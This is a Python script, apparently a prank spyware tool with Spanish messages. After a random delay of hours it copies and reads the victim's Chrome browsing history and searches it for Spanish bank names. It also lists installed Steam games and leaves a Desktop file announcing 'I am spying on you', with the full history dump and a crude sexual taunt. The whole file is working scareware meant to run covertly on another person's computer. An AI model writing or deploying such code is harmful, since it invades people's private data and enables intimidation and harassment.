import sys
import os
import re
from shutil import copyfile
from time import sleep
from random import randrange
from pathlib import Path
import sqlite3
import glob

#you can change the archive name only change de variable under this
HACKER_NAME_FILE = "PARA TI.txt"


def get_user_path():
    return "{}/".format(Path.home())


def steam_check_games(hacker_file):
    try:
         steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
         games = []

         games_path = glob.glob(steam_path)
         games_path.sort(key=os.path.getmtime, reverse=True)
         steam_share = "Steamworks Shared"
         steam_controller = "Steam Controller Configs"

         for games_path in games_path:
             games.append(games_path.split("\\")[-1])

         for a in games:
             if a == steam_share:
                 games.remove(a)
         for b in games:
             if b == steam_controller:
                 games.remove(b)

         hacker_file.write("\nvi que estuviste jugando a algunos juegoss como estos {} ..... ¿puede ser?".format(", ".join(games[:3])))

    except: FileNotFoundError


def delay_action():
    # We define that there are between 1 and 4 hours
    n_hours = randrange(1, 4)
    # We defina that there are between 1 and 60 minutes
    n_mins = randrange(1, 60)
    print("Durmiendo {} horas y {} minutos".format(n_hours, n_mins))
    # We sleep the system random minutes for the joke is more realistic
    n_mins = sleep(n_mins*60)
    n_hours = sleep(n_hours*60*60)


def check_bank_account(hacker_file,chrome_history ):
    his_bank = None
    banks = ["BBVA","CaixaBank","Santander"]

    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break
    if his_bank!= None:
        hacker_file.write("\n Ademas veo que guardas tu plata en {} .. interesante\n".format(his_bank))


def create_hacker_file(user_path):
        hacker_file = open(user_path + "/Desktop/" + HACKER_NAME_FILE, "w")
        hacker_file.write("Te estoy espiando, cuidado estoy en tu pc, basta de porno gay aleman, que te estoy viendo\n")
        return hacker_file


def get_chrome_history(user_path):
    url = None
    while not url:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)
            conn = sqlite3.connect(temp_history)
            cursor = conn.cursor()
            cursor.execute("SELECT u.url, u.last_visit_time FROM urls u;")
            url = cursor.fetchall()
            conn.close()
            return url
        except sqlite3.OperationalError:
            print("historial inaccesible, intentando en 3 segundos")
            sleep(3)


def write_history(hacker_file,chrome_history):

    hacker_file.write("\nTu Historial es {}".format(chrome_history)+ "\n")


def main():
     #We define that there are between 1 and 4 hours
     delay_action()
     #calculate the user path
     user_path = get_user_path()

     #we create the archive in the desktop
     chrome_history = get_chrome_history(user_path)
     hacker_file=  create_hacker_file(user_path)

     write_history(hacker_file,chrome_history)
     check_bank_account(hacker_file,chrome_history)
     steam_check_games(hacker_file)


if __name__ == "__main__":
    main()